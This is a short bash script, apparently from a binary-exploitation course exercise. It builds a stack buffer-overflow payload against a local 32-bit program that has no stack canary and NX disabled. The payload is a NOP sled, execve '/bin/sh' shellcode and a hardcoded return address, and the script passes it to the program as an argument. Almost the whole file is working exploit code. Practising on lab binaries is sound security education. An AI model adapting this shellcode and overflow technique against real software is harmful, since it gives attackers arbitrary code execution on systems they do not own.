#!/bin/bash
#./exercise4: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=4cd222c388ce6fe426b38f683eb50965f60a9dcc, for GNU/Linux 3.2.0, not stripped

    #Arch:     i386-32-little
    #RELRO:    Full RELRO
    #Stack:    No canary found
    #NX:       NX disabled
    #PIE:      PIE enabled
    #RWX:      Has RWX segments

buffer_sum=1024
buffer=800
let "end_buffer= $buffer_sum - $buffer"
shell_code="\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
nop_sled=""
nop_end=""
shell_len=${#shell_code}
let "shell_len = ((shell_len-7)/4)+7"
let "nop_len = $buffer-$shell_len"
for ((i=1; i<=$nop_len; i++))
do 
    nop_sled+="\x90"
done

for ((i=1; i<=$end_buffer; i++))
do 
    nop_end+="\x90"
done

ret_addr="\x34\xd3\xff\xff"
payload=$nop_sled$shell_code$ret_addr$nop_end
#cgdb --args ./exercise4 "`echo -e $payload`" set buffer to 992
./ex4 "`echo -e $payload`"
